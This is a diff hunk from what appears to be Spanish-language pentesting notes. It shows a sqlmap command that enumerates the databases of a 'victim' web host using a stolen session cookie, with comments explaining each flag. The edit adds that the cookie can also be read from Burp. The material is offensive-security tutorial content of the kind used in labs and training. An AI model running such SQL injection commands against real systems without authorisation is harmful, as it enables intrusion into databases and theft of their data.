@@ -20,7 +20,7 @@ Cuando mires en una maquina victima el directorio **/.git/** quiere decir que es
 ```bash 
 ❯ sqlmap -u 'http://<IP Victima>' --dbs --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch  # Debemos de colocar la url hasta el parametro que se usa para modificar e inyectar el SQL.
 	# dbs = Haremos que nos enumere las bases de datos, pero antes debemos de estar autenticados 
-	# cookie = "usuario=valor" Colocar la Cookie de Sesion de la web que se encuentra en (Inspector > Storage > Value)
+	# cookie = "usuario=valor" Colocar la Cookie de Sesion de la web que se encuentra en (Inspector > Storage > Value) o en Burp
 	# dbms = Para indicarle que la base de datos es Mysql y asi evitar algunas preguntas (Esto si conocemos que base de datos esta corriendo) 
 	# batch = Indicar que no queremos que nos este preguntando y solo nos muestre los resultados obtenidos
 
